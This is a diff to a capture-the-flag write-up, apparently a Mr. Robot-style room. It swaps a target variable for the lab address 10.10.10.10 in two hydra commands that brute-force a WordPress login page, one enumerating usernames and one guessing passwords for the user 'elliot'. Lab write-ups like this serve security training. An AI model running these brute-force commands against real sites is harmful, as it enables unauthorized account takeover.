@@ -126,7 +126,7 @@ Keeping that in mind, we want to first use a **fixed password** and our **wordli
 
 ```bash
 hydra -L ./new.txt -p test \
-    $TARGET http-post-form \
+    10.10.10.10 http-post-form \
     "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -I 2>&1 | tee $ROOM/hydra-usernames.log
 ```
 
@@ -136,7 +136,7 @@ From this effort, we see the username "Elliot" in various casing, so it's probab
 
 ```bash
 hydra -l elliot -P ./new.txt \     
-    $TARGET http-post-form \
+    10.10.10.10 http-post-form \
     "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered" -I 2>&1 | tee $ROOM/hydra-passwords.log
 ```
 
